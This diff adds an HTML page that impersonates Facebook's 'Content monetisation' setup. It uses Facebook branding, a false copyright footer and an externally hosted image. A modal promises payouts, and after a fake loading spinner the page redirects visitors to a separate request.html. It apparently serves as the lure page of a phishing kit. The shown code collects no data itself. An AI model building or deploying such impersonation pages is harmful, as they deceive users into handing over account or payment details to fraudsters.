@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Content Monetisation - Facebook</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-blue: #1877F2;
+      --primary-blue-hover: #0E66D0;
+      --primary-blue-active: #0D5ABC;
+      --text-primary: #1C1E21;
+      --text-secondary: #65676B;
+      --background: #F0F2F5;
+      --card-background: #FFFFFF;
+      --modal-background: rgba(0, 0, 0, 0.4);
+      --shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+      --shadow-hover: 0 4px 8px rgba(0, 0, 0, 0.15);
+      --border-radius: 8px;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background-color: var(--background);
+      color: var(--text-primary);
+      line-height: 1.5;
+      padding: 16px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 32px;
+      padding: 0 16px;
+    }
+
+    .header__title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: var(--text-primary);
+    }
+
+    .header__subtitle {
+      font-size: 16px;
+      color: var(--text-secondary);
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    .main {
+      display: flex;
+      justify-content: center;
+      padding: 0 16px;
+    }
+
+    .setup-card {
+      background-color: var(--card-background);
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow);
+      display: flex;
+      max-width: 700px;
+      width: 100%;
+      overflow: hidden;
+      transition: box-shadow 0.2s ease;
+    }
+
+    .setup-card:hover {
+      box-shadow: var(--shadow-hover);
+    }
+
+    .setup-card__content {
+      padding: 24px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start; /* left align */
+    }
+
+    .setup-card__description {
+      font-size: 16px;
+      color: var(--text-secondary);
+      margin-bottom: 24px;
+      align-self: flex-start;
+    }
+
+    .setup-card__button {
+      background-color: var(--primary-blue);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 16px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+      align-self: flex-end;
+      margin-top: 20px;
+    }
+
+    .setup-card__button:hover {
+      background-color: var(--primary-blue-hover);
+    }
+
+    .setup-card__button:focus {
+      outline: 2px solid var(--primary-blue);
+      outline-offset: 2px;
+    }
+
+    .setup-card__button:active {
+      background-color: var(--primary-blue-active);
+    }
+
+    .setup-card__image-container {
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+    }
+
+    .setup-card__image {
+      max-width: 120px;
+      height: auto;
+      border-radius: 8px;
+    }
+
+    /* ----------- MOBILE DESIGN ----------- */
+    @media (max-width: 768px) {
+      .setup-card {
+        flex-direction: column; /* stack image + content */
+        text-align: center;
+      }
+
+      .setup-card__image-container {
+        justify-content: center;
+        padding: 16px 0;
+      }
+
+      .setup-card__image {
+        max-width: 200px;
+      }
+
+      .setup-card__content {
+        align-items: center;
+      }
+
+      .setup-card__description {
+        text-align: center;
+      }
+
+      .setup-card__button {
+        align-self: center;
+        width: 100%;
+        margin-top: 16px;
+      }
+    }
+
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: var(--modal-background);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .modal__content {
+      background-color: var(--card-background);
+      border-radius: var(--border-radius);
+      padding: 24px;
+      width: 100%;
+      max-width: 500px;
+      position: relative;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+
+    .modal__close {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: var(--text-secondary);
+      padding: 0;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+    }
+
+    .modal__close:hover {
+      background-color: var(--background);
+    }
+
+    .modal__close:focus {
+      outline: 2px solid var(--primary-blue);
+    }
+
+    .modal__title {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      color: var(--text-primary);
+      padding-right: 30px;
+    }
+
+    .modal__description {
+      font-size: 16px;
+      color: var(--text-secondary);
+      margin-bottom: 20px;
+    }
+
+    .modal__steps {
+      margin-left: 20px;
+      margin-bottom: 24px;
+    }
+
+    .modal__step {
+      font-size: 16px;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+    }
+
+    .modal__button {
+      background-color: var(--primary-blue);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 16px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+      width: 100%;
+    }
+
+    .modal__button:hover {
+      background-color: var(--primary-blue-hover);
+    }
+
+    .modal__button:focus {
+      outline: 2px solid var(--primary-blue);
+      outline-offset: 2px;
+    }
+
+    .modal__button:active {
+      background-color: var(--primary-blue-active);
+    }
+
+    footer {
+      margin-top: 32px;
+      text-align: center;
+      color: var(--text-secondary);
+      font-size: 14px;
+      padding: 0 16px;
+    }
+    
+    /* Loader Styles */
+    .loader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.9);
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    
+    .loader-spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid var(--primary-blue);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+    
+    .loader-text {
+      font-size: 16px;
+      color: var(--text-primary);
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <main class="main">
+      <div class="setup-card">
+
+        <!-- Image LEFT (desktop), TOP (mobile) -->
+        <div class="setup-card__image-container">
+          <img src="https://ik.imagekit.io/qwindaujh/WhatsApp%20Image%202025-08-28%20at%2003.29.16_ba64a69b.jpg?updatedAt=1756382416448"
+               alt="Monetization illustration"
+               class="setup-card__image">
+        </div>
+
+        <!-- Content -->
+        <div class="setup-card__content">
+          <h2 class="setup-card__title">Content monetisation</h2>
+          <p class="setup-card__description">Earn money from Facebook for all of your eligible content in one place.</p>
+          <button class="setup-card__button" id="setupButton">Set up</button>
+        </div>
+
+      </div>
+    </main>
+
+    <footer>
+      <p>&copy; 2025 Facebook. All rights reserved.</p>
+    </footer>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal" id="setupModal">
+    <div class="modal__content">
+      <button class="modal__close" id="closeModal" aria-label="Close modal">&times;</button>
+      <h2 class="modal__title">Set Up Content Monetisation</h2>
+      <p class="modal__description">To start earning money from your content, you'll need to complete the following steps:</p>
+      <ul class="modal__steps">
+        <li class="modal__step">Review eligibility requirements</li>
+        <li class="modal__step">Set up payout account</li>
+        <li class="modal__step">Agree to monetisation terms</li>
+        <li class="modal__step">Submit for review</li>
+      </ul>
+      <button class="modal__button" id="continueButton">Continue</button>
+    </div>
+  </div>
+  
+  <!-- Loader -->
+  <div class="loader" id="loader">
+    <div class="loader-spinner"></div>
+    <p class="loader-text">Setting up monetization...</p>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const setupButton = document.getElementById('setupButton');
+      const modal = document.getElementById('setupModal');
+      const closeModal = document.getElementById('closeModal');
+      const continueButton = document.getElementById('continueButton');
+      const loader = document.getElementById('loader');
+      
+      // URL to redirect to (replace with your actual URL)
+      const redirectUrl = 'request.html';
+
+      setupButton.addEventListener('click', function() {
+        modal.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+      });
+
+      closeModal.addEventListener('click', function() {
+        modal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      });
+
+      continueButton.addEventListener('click', function() {
+        // Show loader
+        loader.style.display = 'flex';
+        modal.style.display = 'none';
+        
+        // Simulate processing time (2 seconds)
+        setTimeout(function() {
+          // Redirect to the other HTML file
+          window.location.href = redirectUrl;
+        }, 2000);
+      });
+
+      window.addEventListener('click', function(event) {
+        if (event.target === modal) {
+          modal.style.display = 'none';
+          document.body.style.overflow = 'auto';
+        }
+      });
+
+      document.addEventListener('keydown', function(event) {
+        if (event.key === 'Escape' && modal.style.display === 'flex') {
+          modal.style.display = 'none';
+          document.body.style.overflow = 'auto';
+        }
+      });
+      
+      // Alternative direct redirection without modal
+      // setupButton.addEventListener('click', function() {
+      //   loader.style.display = 'flex';
+      //   
+      //   setTimeout(function() {
+      //     window.location.href = request.html;
+      //   }, 1500);
+      // });
+    });
+  </script>
+</body>
+</html>
